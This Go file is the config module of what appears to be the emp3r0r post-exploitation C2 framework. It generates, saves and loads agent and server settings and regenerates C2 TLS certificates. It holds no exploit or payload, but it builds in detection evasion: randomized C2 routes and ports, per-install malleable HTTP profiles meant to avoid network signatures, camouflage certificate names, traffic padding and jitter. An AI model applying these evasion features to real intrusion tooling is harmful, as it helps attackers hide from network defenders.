package config

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"sync"

	"github.com/google/uuid"
	"github.com/jm33-m0/emp3r0r/core/internal/def"
	"github.com/jm33-m0/emp3r0r/core/internal/live"
	"github.com/jm33-m0/emp3r0r/core/internal/transport"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
	"github.com/jm33-m0/emp3r0r/core/lib/netutil"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// SaveConfigJSON save runtime config to emp3r0r.json
func SaveConfigJSON() (err error) {
	cfg := live.GetRuntimeConfig()

	// Use shadow struct for JSON serialization to keep strings out of shared def package
	jCfg := jsonConfig{
		CCAddress:              cfg.CCAddress,
		CCHost:                 cfg.CCHost,
		CCPort:                 cfg.CCH2Port,
		AgentSocksServerPort:   cfg.AgentSocksServerPort,
		AgentSocksTimeout:      cfg.AgentSocksTimeout,
		StagerHTTPListenerPort: cfg.StagerHTTPListenerPort,
		Password:               cfg.Password,
		Socks5LocalPort:        cfg.Socks5LocalPort,
		KCPServerPort:          cfg.P2PRelayPort,
		KCPClientPort:          cfg.KCPClientPort,
		UseKCP:                 cfg.UseKCP,
		EnableNCSI:             cfg.EnableNCSI,
		MeshGossipPort:         cfg.MeshGossipPort,
		PreflightEnabled:       cfg.PreflightEnabled,
		PreflightURL:           cfg.PreflightURL,
		PreflightMethod:        cfg.PreflightMethod,
		PreflightHeaders:       cfg.PreflightHeaders,
		PreflightIntervalMin:   cfg.PreflightIntervalMin,
		PreflightIntervalMax:   cfg.PreflightIntervalMax,
		CAPEM:                  cfg.CAPEM,
		C2TransportProxy:       cfg.C2TransportProxy,
		CDNProxy:               cfg.CDNProxy,
		DoHServer:              cfg.DoHServer,
		ECHServerName:          cfg.ECHServerName,
		AgentUUID:              cfg.AgentUUID,
		AgentUUIDSig:           cfg.AgentUUIDSig,
		AgentTag:               cfg.AgentTag,
		CCTimeout:              cfg.CCTimeout,
		PaddingMin:             cfg.PaddingMin,
		PaddingMax:             cfg.PaddingMax,
		Jitter:                 cfg.Jitter,
		PollInterval:           cfg.PollInterval,
		PollWindow:             cfg.PollWindow,
		OfflineGrace:           cfg.OfflineGrace,
		ModulePath:             cfg.ModulePath,
		IsRunByStager:          cfg.IsRunByStager,
		MachineID:              cfg.MachineID,
		InitialPeers:           cfg.InitialPeers,
		IsP2PEnabled:           cfg.IsP2PEnabled,
		IsDirectC2Enabled:      cfg.IsDirectC2Enabled,
		PersistentRouter:       cfg.PersistentRouter,
		OperatorIdleTimeout:    cfg.OperatorIdleTimeout,
		P2PTransport:           cfg.P2PTransport,
		CamouflageCertOrg:      cfg.CamouflageCertOrg,
		CamouflageCertCN:       cfg.CamouflageCertCN,
		C2ChannelMode:          cfg.C2ChannelMode,
		QUICStandardKey:        cfg.QUICStandardKey,
		CCHTTPPort:             cfg.CCHTTPPort,
		C2Routes: jsonC2Routing{
			Checkin: cfg.C2Routes.Checkin,
			Msg:     cfg.C2Routes.Msg,
			FTP:     cfg.C2Routes.FTP,
			WWW:     cfg.C2Routes.WWW,
			Proxy:   cfg.C2Routes.Proxy,
		},
		MalleableC2: jsonMalleableHTTPConfig{
			C2Path:        cfg.MalleableC2.C2Path,
			SessionHeader: cfg.MalleableC2.SessionHeader,
			SessionValue:  cfg.MalleableC2.SessionValue,
			InitHeader:    cfg.MalleableC2.InitHeader,
			InitValue:     cfg.MalleableC2.InitValue,
			CloseHeader:   cfg.MalleableC2.CloseHeader,
			CloseValue:    cfg.MalleableC2.CloseValue,
			CustomHeaders: cfg.MalleableC2.CustomHeaders,
		},
		SNI: cfg.SNI,
	}

	w_data, err := json.MarshalIndent(jCfg, "", "  ")
	if err != nil {
		return fmt.Errorf("saving %s: %v", live.EmpConfigFile, err)
	}

	return os.WriteFile(live.EmpConfigFile, w_data, 0o600)
}

// InitConfigFile generate a new emp3r0r.json
func InitConfigFile(cc_host string) (err error) {
	// C2 service ports
	if live.RuntimeConfig.CCH2Port == "0" {
		live.RuntimeConfig.CCH2Port = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	}
	if live.RuntimeConfig.CCHTTPPort == "0" {
		live.RuntimeConfig.CCHTTPPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	}

	// randomize other ports
	live.RuntimeConfig.CCAddress = cc_host
	live.RuntimeConfig.CCHost = cc_host
	live.RuntimeConfig.AgentSocksServerPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.MeshGossipPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.Socks5LocalPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.P2PRelayPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.KCPClientPort = fmt.Sprintf("%v", util.RandInt(1025, 65534))
	live.RuntimeConfig.StagerHTTPListenerPort = fmt.Sprintf("%v", util.RandInt(1026, 65534))
	live.RuntimeConfig.CCTimeout = util.RandInt(10000, 20000)
	live.RuntimeConfig.OperatorIdleTimeout = 1800
	live.RuntimeConfig.C2ChannelMode = def.C2ChannelModeDefault
	live.RuntimeConfig.C2Routes.Checkin = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.Msg = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.FTP = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.WWW = "c2-" + strings.ToLower(util.RandStr(12))
	live.RuntimeConfig.C2Routes.Proxy = "c2-" + strings.ToLower(util.RandStr(12))

	live.RuntimeConfig.AgentUUID = uuid.NewString()
	live.RuntimeConfig.Password = util.RandStr(20)

	// time intervals

	// Preflight default
	live.RuntimeConfig.PreflightEnabled = true
	if live.RuntimeConfig.PreflightURL == "" {
		live.RuntimeConfig.PreflightURL = fmt.Sprintf("http://%s/%s", cc_host, util.RandStr(util.RandInt(5, 10)))
	}
	live.RuntimeConfig.PreflightMethod = "POST"
	live.RuntimeConfig.AgentSocksTimeout = 0 // disable timeout by default, leave it to the OS

	// sign agent UUID
	// CA
	err = transport.LoadCACrt()
	if err != nil {
		return fmt.Errorf("failed to load CA: %v", err)
	}
	live.RuntimeConfig.CAPEM = string(transport.GetCACrtPEM())
	// sign
	sig, err := transport.SignWithCAKey([]byte(live.RuntimeConfig.AgentUUID))
	if err != nil {
		return fmt.Errorf("failed to sign agent UUID: %v", err)
	}
	live.RuntimeConfig.AgentUUIDSig = base64.URLEncoding.EncodeToString(sig)
	live.RuntimeConfig.AgentTag = util.GenAgentTag(live.RuntimeConfig.AgentUUID)

	if live.RuntimeConfig.PaddingMin == 0 {
		live.RuntimeConfig.PaddingMin = 1024
	}
	if live.RuntimeConfig.PaddingMax == 0 {
		live.RuntimeConfig.PaddingMax = 10240
	}
	transport.SetC2Padding(live.RuntimeConfig.PaddingMin, live.RuntimeConfig.PaddingMax)
	transport.SetC2ServerName(live.RuntimeConfig.SNI)
	transport.SetMeshCamouflageIdentity(live.RuntimeConfig.CamouflageCertOrg, live.RuntimeConfig.CamouflageCertCN)
	if live.RuntimeConfig.Jitter == 0 {
		live.RuntimeConfig.Jitter = 20
	}
	if live.RuntimeConfig.PollInterval == 0 {
		live.RuntimeConfig.PollInterval = 60
	}
	if live.RuntimeConfig.PollWindow == 0 {
		live.RuntimeConfig.PollWindow = 5
	}

	// Malleable C2 defaults: a fixed profile is a network signature, so draw a
	// fresh one for this install. It is persisted below and embedded in every
	// agent, keeping the client and server in agreement.
	live.RuntimeConfig.MalleableC2 = transport.RandomMalleableHTTPConfig()

	// save
	return SaveConfigJSON()
}

// LoadCACrt2RuntimeConfig CA cert to runtime config
func LoadCACrt2RuntimeConfig() error {
	err := transport.LoadCACrt()
	if err != nil {
		return err
	}
	live.RuntimeConfig.CAPEM = string(transport.GetCACrtPEM())
	return nil
}

func ReadJSONConfig(jsonData []byte, config_to_write *def.Config) error {
	if jsonData == nil {
		// read JSON
		var err error
		jsonData, err = os.ReadFile(live.EmpConfigFile)
		if err != nil {
			return err
		}
	}
	if config_to_write == nil {
		config_to_write = live.RuntimeConfig
	}

	if err := readJSONConfig(jsonData, config_to_write); err != nil {
		return err
	}
	// Keep the sender-side padding range in sync with the loaded config.
	transport.SetC2Padding(config_to_write.PaddingMin, config_to_write.PaddingMax)
	transport.SetC2ServerName(config_to_write.SNI)
	transport.SetMeshCamouflageIdentity(config_to_write.CamouflageCertOrg, config_to_write.CamouflageCertCN)
	return nil
}

// InitCertsAndConfig generate certs if not found, then generate config file
func InitCertsAndConfig() error {
	// if we are not running as server, return, the certs are already generated
	if !live.IsServer {
		return nil
	}

	if _, err := os.Stat(transport.CaCrtFile); os.IsNotExist(err) {
		logging.Warningf("CA cert not found, generating a new one")
		_, err := transport.GenCerts(nil, transport.CaCrtFile, transport.CaKeyFile, "", "", true)
		if err != nil {
			return fmt.Errorf("GenCerts: %v", err)
		}
	}

	// The operator channel is plain HTTP over the userspace WireGuard stack,
	// authenticated by the per-operator WireGuard key. No operator-facing
	// certificates or CA are generated.
	return nil
}

// c2CertMu serializes certificate generation/reload. GenCerts writes the
// certificate and key as two files, so a concurrent reader must never observe
// a half-written pair.
var c2CertMu sync.Mutex

// GenC2Certs ensures the C2 TLS certificate covers hosts_str. It preserves the
// existing SANs, adds the requested names plus localhost, regenerates only when
// the set changes, and reloads the in-process certificate used by TLS/QUIC
// handshakes. It is used both at startup and by the operator certificate API.
func GenC2Certs(hosts_str string) error {
	c2CertMu.Lock()
	defer c2CertMu.Unlock()

	requested := make([]string, 0)
	for _, host := range strings.Fields(hosts_str) {
		host = strings.ToLower(strings.TrimSpace(host))
		if host == "" {
			continue
		}
		if !netutil.ValidateHostName(host) {
			return fmt.Errorf("invalid host name: %s", host)
		}
		requested = append(requested, host)
	}

	certExists := util.IsFileExist(transport.ServerCrtFile) && util.IsFileExist(transport.ServerKeyFile)
	existing := transport.NamesInCert(transport.ServerCrtFile)

	seen := make(map[string]struct{}, len(existing)+len(requested)+2)
	hosts := make([]string, 0, len(existing)+len(requested)+2)
	changed := !certExists
	add := func(host string) {
		host = strings.ToLower(strings.TrimSpace(host))
		if host == "" {
			return
		}
		if _, ok := seen[host]; ok {
			return
		}
		seen[host] = struct{}{}
		hosts = append(hosts, host)
	}
	for _, host := range existing {
		add(host)
	}
	for _, host := range requested {
		if _, ok := seen[host]; !ok {
			changed = true
		}
		add(host)
	}
	for _, host := range []string{def.Localhost, "localhost"} {
		if _, ok := seen[host]; !ok {
			changed = true
		}
		add(host)
	}

	if !changed {
		return transport.ReloadServerTLSCert()
	}
	logging.Warningf("Updating C2 TLS certificate for %v", hosts)
	if _, certErr := transport.GenCerts(hosts, transport.ServerCrtFile, transport.ServerKeyFile,
		transport.CaKeyFile, transport.CaCrtFile, false); certErr != nil {
		return fmt.Errorf("generating C2 TLS cert: %v", certErr)
	}
	if err := transport.ReloadServerTLSCert(); err != nil {
		return fmt.Errorf("reloading C2 TLS certificate: %w", err)
	}
	logging.Successf("C2 TLS certificate updated for %v", hosts)
	return nil
}

// LoadConfig load config JSON file
func LoadConfig() error {
	err := LoadCACrt2RuntimeConfig()
	if err != nil {
		return fmt.Errorf("failed to load CA to RuntimeConfig: %v", err)
	}

	if util.IsFileExist(live.EmpConfigFile) {
		return ReadJSONConfig(nil, nil)
	}
	// init config file using the first host name
	return InitConfigFile(def.Localhost)
}
